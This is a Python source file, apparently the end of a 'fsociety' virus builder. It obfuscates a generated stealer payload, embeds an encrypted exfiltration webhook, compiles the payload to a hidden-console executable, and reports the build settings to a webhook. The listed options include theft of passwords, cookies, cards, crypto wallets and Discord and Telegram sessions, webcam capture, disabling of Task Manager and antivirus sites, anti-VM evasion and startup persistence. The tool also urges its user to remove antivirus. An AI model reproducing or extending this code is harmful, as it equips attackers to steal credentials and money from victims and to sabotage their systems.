                        if isinstance(node, ast.Assign):
                            for target in node.targets:
                                if isinstance(target, ast.Name):
                                    var_name = target.id
                                    if var_name not in variable_map and "v4r_" in var_name:
                                        new_name = RandomName()
                                        variable_map[var_name] = new_name
                                        target.id = new_name

                        elif isinstance(node, ast.FunctionDef):
                            if "D3f_" in node.name: 
                                if node.name not in variable_map:
                                    new_name = RandomName()
                                    variable_map[node.name] = new_name
                                    node.name = new_name 
                                for arg in node.args.args:
                                    var_name = arg.arg
                                    if var_name not in variable_map and "v4r_" in var_name:
                                        new_name = RandomName()
                                        variable_map[var_name] = new_name
                                        arg.arg = new_name

                        elif isinstance(node, ast.ClassDef):
                            if node.name not in variable_map and "v4r_" in node.name:
                                new_name = RandomName()
                                variable_map[node.name] = new_name
                                node.name = new_name

                        for child in ast.iter_child_nodes(node):
                            visit_node(child)

                    tree = ast.parse(original_script)
                    visit_node(tree)

                    with open(file_python, 'r', encoding='utf-8') as file:
                        lines = file.readlines()

                    with open(file_python, 'w', encoding='utf-8') as file:
                        for line in lines:
                            for var_name, new_name in variable_map.items():
                                if var_name in line:
                                    line = line.replace(var_name, new_name)
                            file.write(line)

                    print(f"[{current_time_hour()}] INFO All the Identifiers of the python file were obfuscated.")
                except Exception as e:
                    print(f"[{current_time_hour()}] ERROR Error during obfuscation: {str(e)}")

        def SendWebhook(webhook):
            embed_config = {
                'title': f'fsociety Virus Created (Config):',
                'color': color_webhook,
                "fields": [
                    {"name": f"Name:",                   "value": f"""```{name_file}```""",                        "inline": True},
                    {"name": f"Type:",                   "value": f"""```{file_type}```""",                        "inline": True},
                    {"name": f"Webhook:",                "value": f"""{webhook}""",                                "inline": False},
                ],
                'footer': {
                    "text": username_webhook,
                    "icon_url": avatar_webhook,
                    }
                }
            
            embed_stealer = {
                'title': f'fsociety Virus Created (Stealer):',
                'color': color_webhook,
                "fields": [
                    {"name": f"System Info:",            "value": f"""```{option_system}```""",                    "inline": True},
                    {"name": f"Wallets Session Files:",  "value": f"""```{option_game_launchers}```""",            "inline": True},
                    {"name": f"Games Session Files:",    "value": f"""```{option_system}```""",                    "inline": True},
                    {"name": f"Telegram Session Files:", "value": f"""```{option_apps}```""",                      "inline": True},
                    {"name": f"Roblox Accounts:",        "value": f"""```{option_roblox}```""",                    "inline": True},
                    {"name": f"Discord Accounts:",       "value": f"""```{option_discord}```""",                   "inline": True},
                    {"name": f"Discord Injection:",      "value": f"""```{option_discord_injection}```""",         "inline": True},
                    {"name": f"Passwords:",              "value": f"""```{option_passwords}```""",                 "inline": True},
                    {"name": f"Cookies:",                "value": f"""```{option_cookies}```""",                   "inline": True},
                    {"name": f"Browsing History:",       "value": f"""```{option_history}```""",                   "inline": True},
                    {"name": f"Download History:",       "value": f"""```{option_downloads}```""",                 "inline": True},
                    {"name": f"Cards:",                  "value": f"""```{option_cards}```""",                     "inline": True},
                    {"name": f"Extentions:",             "value": f"""```{option_extentions}```""",                "inline": True},
                    {"name": f"Interesting Files:",      "value": f"""```{option_interesting_files}```""",         "inline": True},
                    {"name": f"Webcam:",                 "value": f"""```{option_webcam}```""",                    "inline": True},
                    {"name": f"Screenshot:",             "value": f"""```{option_screenshot}```""",                "inline": True},
                ],
                'footer': {
                    "text": username_webhook,
                    "icon_url": avatar_webhook,
                    }
                }
            
            embed_malware = {
                'title': f'fsociety Virus Created (Malware):',
                'color': color_webhook,
                "fields": [
                    {"name": f"Block Key:",              "value": f"""```{option_block_key}```""",                 "inline": True},
                    {"name": f"Block Mouse:",            "value": f"""```{option_block_mouse}```""",               "inline": True},
                    {"name": f"Block Task Manager:",     "value": f"""```{option_block_task_manager}```""",        "inline": True},
                    {"name": f"Block AV Website:",       "value": f"""```{option_block_website}```""",             "inline": True},
                    {"name": f"Shutdown:",               "value": f"""```{option_shutdown}```""",                  "inline": True},
                    {"name": f"Spam Open Program:",      "value": f"""```{option_spam_open_programs}```""",        "inline": True},
                    {"name": f"Spam Create File:",       "value": f"""```{option_spam_create_files}```""",         "inline": True},
                    {"name": f"Fake Error:",             "value": f"""```{option_fake_error}```""",                "inline": True},
                    {"name": f"Launch At Startup:",      "value": f"""```{option_startup}```""",                   "inline": True},
                    {"name": f"Restart Every 5min:",     "value": f"""```{option_restart}```""",                   "inline": True},
                    {"name": f"Anti VM & Debug:",        "value": f"""```{option_anti_vm_and_debug}```""",         "inline": True},
                ],
                'footer': {
                    "text": username_webhook,
                    "icon_url": avatar_webhook,
                    }
                }
            
            try:
                requests.post(webhook, data=json.dumps({'embeds': [embed_config],  'username': username_webhook, 'avatar_url': avatar_webhook}), headers={'Content-Type': 'application/json'})
                requests.post(webhook, data=json.dumps({'embeds': [embed_stealer], 'username': username_webhook, 'avatar_url': avatar_webhook}), headers={'Content-Type': 'application/json'})
                requests.post(webhook, data=json.dumps({'embeds': [embed_malware], 'username': username_webhook, 'avatar_url': avatar_webhook}), headers={'Content-Type': 'application/json'})
            except Exception as e:
                print(f"[{current_time_hour()}] ERROR Failed to send webhook: {str(e)}")

        def ConvertToExe(file_python, path_destination, name_file, icon_path=None):
            if sys.platform.startswith("win"):
                print(f"[{current_time_hour()}] WAIT Uninstallation of pathlib..")
                subprocess.run(["python", "-m", "pip", "uninstall", "pathlib", "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"[{current_time_hour()}] WAIT Upgrade pyinstaller..")
                subprocess.run(["python", "-m", "pip", "install", "--upgrade", "pyinstaller"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif sys.platform.startswith("linux"):
                print(f"[{current_time_hour()}] WAIT Uninstallation of pathlib..")
                subprocess.run(["python3", "-m", "pip3", "uninstall", "pathlib", "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"[{current_time_hour()}] WAIT Upgrade pyinstaller..")
                subprocess.run(["python3", "-m", "pip3", "install", "--upgrade", "pyinstaller"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            print(f"[{current_time_hour()}] WAIT Converting to executable..")

            try:
                script_path = os.path.abspath(file_python)
                working_directory = os.path.dirname(script_path)
                os.chdir(working_directory)

                pyinstaller = ['pyinstaller', '--onefile', '--distpath', path_destination, '--noconsole', script_path]

                if icon_path and icon_path != "None":
                    pyinstaller.extend(['--icon', icon_path])

                result = subprocess.run(pyinstaller, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                if result.stderr:
                    if "completed successfully" not in result.stderr:
                        print(f"[{current_time_hour()}] ERROR Error during conversion: {result.stderr}")
                        Continue()
                        Reset()
                    else:
                        print(f"[{current_time_hour()}] INFO Conversion successful.")
                else:
                    print(f"[{current_time_hour()}] INFO Conversion successful.")

                try:
                    print(f"[{current_time_hour()}] WAIT Removing temporary files from conversion..")     
                    shutil.rmtree(os.path.join(working_directory, "build"))
                    os.remove(os.path.join(working_directory, f"{name_file}.spec"))
                    os.remove(file_python)
                    print(f"[{current_time_hour()}] INFO Temporary file removed.")
                except Exception as e:
                    print(f"[{current_time_hour()}] ERROR Temporary file not removed: {str(e)}")
                
            except Exception as e:
                print(f"[{current_time_hour()}] ERROR Error during conversion: {str(e)}")
                Continue()
                Reset()

        file_python_relative = f'1-Output\\VirusBuilder\\{name_file}.py'
        file_python = os.path.join(tool_path, "1-Output", "VirusBuilder", f"{name_file}.py")

        path_destination_relative = "1-Output\\VirusBuilder"
        path_destination = os.path.join(tool_path, "1-Output", "VirusBuilder")

        os.makedirs(path_destination, exist_ok=True)

        key_encryption, webhook_encrypted = Encryption(webhook)
        PythonFile(file_python, file_python_relative, key_encryption, webhook_encrypted)
        PythonIdentifierObfuscation(file_python)

        if file_type == "Exe File":
            if not os.path.exists(path_destination):
                print(f"[{current_time_hour()}] ERROR Files are missing, reinstall the tool and try again.")
                Continue()
                Reset()
            
            if os.path.exists(file_python):
                if not os.path.exists(icon_path) or icon_path == "None":
                    ConvertToExe(file_python, path_destination, name_file)
                else:
                    ConvertToExe(file_python, path_destination, name_file, icon_path)
            else:
                print(f"[{current_time_hour()}] ERROR The python file created previously was deleted, please remove your anti virus and try again.")

        print(f"[{current_time_hour()}] + The virus was created, it is found in: {path_destination_relative}")
        try: 
            os.startfile(path_destination)
        except: 
            pass
        try: 
            SendWebhook(webhook)
        except: 
            pass
        Continue()
        Reset()
    except Exception as e:
        Error(e)

if __name__ == "__main__":

    main()
